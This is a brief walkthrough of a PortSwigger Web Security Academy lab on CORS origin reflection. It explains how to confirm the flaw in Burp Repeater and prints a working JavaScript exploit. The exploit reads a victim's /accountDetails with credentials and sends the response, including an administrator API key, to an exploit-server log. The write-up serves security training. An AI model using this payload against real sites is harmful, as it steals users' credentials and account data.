# [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)

> login the site and during the login there will be a request to the `/accountDetails`, in the response there is a header `Access-Control-Allow-Credentials: true` that indicates it might support `CORS`

- in Burp Repeater add to the request `Origin: https://example.com`
- in the response it should reflect that in as a header -> `Access-Control-Allow-Origin: https://example.com`

> any given `Origin: xyz` reflected in the response

> exploit ->

```
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open("get", "https://xxx.web-security-academy.net/accountDetails", true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location = "/log?key=" + this.responseText;
  }
</script>
```

- the `req.withCredentials = true;` in the request will tell the response should send the victim credentials
- the `location = "/log?key=" + this.responseText;` is for the exploit server, the log page will get all the response text

> deliver it to the victim and then view the exploit, in the logs there will be the administrator api key (in this lab the admin will receive the exploit)
